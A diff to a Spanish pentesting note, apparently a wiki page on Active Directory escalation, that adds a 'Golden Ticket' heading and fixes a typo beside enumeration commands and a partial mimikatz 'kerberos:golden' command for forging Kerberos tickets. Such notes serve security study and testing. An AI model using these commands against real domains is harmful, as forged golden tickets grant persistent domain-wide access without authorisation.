@@ -53,6 +53,8 @@ Get-ADGroup -Identity "Enterprise Admins" -Server "<Dominio.Principal>"
 Get-DomainGroup -Domain <Dominio.Principal> -Identity "Enterprise Admins" | select distinguishedname,objectsid
 ```
 
+
+## Golden Ticket
 ### Explotación -> MIMIKATZ
 Podemos realizar la explotación después de obtener toda la información usando [[MIMIKATZ]]
 Creando primero el `GOLDEN TICKET`
@@ -62,7 +64,7 @@ kerberos:golden /user:hacker/<Dominio.Principal> /domain:<Dominio.Principal> /si
 ```
 
 ### Explotación -> ROBEUS
-Podem[[]]os realizar la explotación después de obtener toda la información usando [[ROBEUS]]
+Podemos realizar la explotación después de obtener toda la información usando [[ROBEUS]]
 Creando primero el `GOLDEN TICKET`
 
 ```shell
